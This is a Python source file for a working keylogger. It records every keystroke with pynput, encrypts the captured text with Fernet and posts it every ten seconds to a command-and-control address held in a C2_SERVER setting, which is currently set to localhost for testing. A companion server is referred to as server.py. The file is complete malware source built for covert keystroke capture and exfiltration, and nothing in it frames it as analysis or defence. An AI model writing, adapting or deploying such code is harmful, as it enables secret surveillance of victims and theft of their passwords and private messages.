import os
import json
import time
from pynput import keyboard
from cryptography.fernet import Fernet
import base64
import requests
import sys

# Configuration
C2_SERVER = "http://localhost:8080"
LOG_INTERVAL = 10  # Changed from 60 to 10 seconds for quicker testing

class KeyLogger:
    def __init__(self):
        self.log = ""
        # Generate or load encryption key
        self.encryption_key = self.get_or_create_key()
        # Fernet key must be 32 url-safe base64-encoded bytes
        self.cipher_suite = Fernet(self.encryption_key)
        
    def get_or_create_key(self):
        """Get existing key or generate new one"""
        key_file = "encryption.key"
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, "wb") as f:
                f.write(key)
            print(f"Generated new encryption key: {key.decode()}")
            print(f"IMPORTANT: Copy this key to server.py: {key.decode()}")
            return key
    
    def encrypt_data(self, data):
        """Encrypt data using AES"""
        return self.cipher_suite.encrypt(data.encode())
    
    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.tab:
                self.log += "\t"
            else:
                self.log += f" [{key}] "
    
    def send_logs_http(self):
        """Send encrypted logs via HTTP POST"""
        if not self.log:
            return
            
        encrypted_log = self.encrypt_data(self.log)
        try:
            requests.post(f"{C2_SERVER}/logs", 
                         data=encrypted_log, 
                         headers={'Content-Type': 'application/octet-stream'})
            self.log = ""
        except Exception as e:
            print(f"Error sending logs: {e}")
    
    def run(self):
        # Start keyboard listener
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        
        # Main loop to send logs periodically
        while True:
            time.sleep(LOG_INTERVAL)
            self.send_logs_http()

if __name__ == "__main__":
    logger = KeyLogger()
    print("Keylogger started. Press Ctrl+C to stop.")
    try:
        logger.run()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
        sys.exit(0)